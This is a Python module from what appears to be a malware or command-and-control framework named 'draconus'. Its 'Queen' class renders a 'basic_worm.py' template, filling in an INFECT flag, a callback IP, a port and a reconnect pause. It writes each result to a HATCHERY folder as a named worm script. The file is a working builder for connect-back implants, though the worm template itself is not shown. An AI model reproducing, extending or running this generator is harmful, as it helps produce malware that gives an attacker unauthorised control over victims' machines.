import os

from jinja2 import Template

from ..CONFIG import APP_DIRECTORY, SYS_MSG_HEADERS, CLIENT_PAUSE_CONNECTION


class Queen:
    def __init__(self):
        self.out_dir = os.path.join(APP_DIRECTORY, "HATCHERY")
        self.templates_dir = os.path.join(APP_DIRECTORY, "draconus", "hive", "templates")
        self.make_dirs()
        self._template = {}

    

    def make_dirs(self):
        if not os.path.exists(self.out_dir):
            os.mkdir(self.out_dir)
    

    def accept_config(self, **config):
        print(config)
    
    def _make_basic_worm(self, **config):
        temp_patch = os.path.join(self.templates_dir, "basic_worm.py")
        with open(temp_patch, "r") as f:
            temp_code = f.read()
        temp_code = Template(temp_code)
        conn_pause = config.get("CLIENT_PAUSE", CLIENT_PAUSE_CONNECTION)
        basic_code = temp_code.render(
            INFECT = config["INFECT"],
            IP = config["IP"],
            PORT = config["PORT"],
            FORMAT_CODE = config["FORMAT_CODE"],
            RAW_LEN = config["RAW_LEN"],
            SYS_MSG = SYS_MSG_HEADERS,
            CONN_PAUSE = conn_pause
        )
        return basic_code
    
    def hatchering(self, **config):
        if config["SERV_TYPE"] == "Echo" or config["SERV_TYPE"] == "Test":
            config.update({"INFECT": True})
            code = self._make_basic_worm(**config)
            self.save_worm(code, config["NAME"])

    def save_worm(self, code, serv_name):
        with open(os.path.join(self.out_dir, f"{serv_name}_worm.py"), "w") as f:
            f.write(code)
        print("[QUEEN] A new worm has hatched")
